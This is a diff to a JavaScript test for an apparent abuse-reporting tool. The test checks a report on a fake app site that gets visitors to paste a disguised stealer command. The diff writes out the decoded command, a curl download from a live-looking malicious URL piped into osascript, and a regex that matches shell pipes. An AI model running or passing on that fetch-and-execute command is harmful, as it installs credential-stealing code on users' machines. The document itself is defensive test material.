@@ -512,12 +512,14 @@ test("an invented-brand app site with a pasted stealer command is reported as ma
 		"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
 		`Page text that shows it, in its original language (defanged): ${JSON.stringify(defanged)}.`,
 		`The page tells visitors to paste and run this command (defanged): ${JSON.stringify(defanged)}.`,
-		`Decoded, it runs: "curl -sfL hxxps://keychainagent[.]pro/wksxgj/ogZhMJB7F277 [pipe] osascript -l JavaScript".`,
+		`Decoded, it runs: "curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 [pipe] osascript -l JavaScript".`,
 		`It shows "brew install --cask paneo" so the visitor believes a legitimate install is running.`,
-		"It downloads and runs code from: hxxps://keychainagent[.]pro/wksxgj/ogZhMJB7F277.",
+		"It downloads and runs code from: https://keychainagent.pro/wksxgj/ogZhMJB7F277.",
 	]);
 	// Report text never carries a runnable command: abuse-form firewalls block a shell chain into an interpreter.
-	expect(evidence).not.toMatch(/\|\s*(?:z|ba)?sh\b|;\s*echo|https:\/\/keychainagent/);
+	expect(evidence).not.toMatch(/\|\s*(?:z|ba)?sh\b|;\s*echo/);
+	// Its URLs are never obfuscated: spam filters score hxxp and [.] and undo them before their blocklist lookup.
+	expect(evidence).not.toMatch(/hxxp|\[\.\]/i);
 	// The assessment keeps the verbatim quote for the case page.
 	expect(finding.evidenceQuote).toBe(paneoInstallCommand);
 });
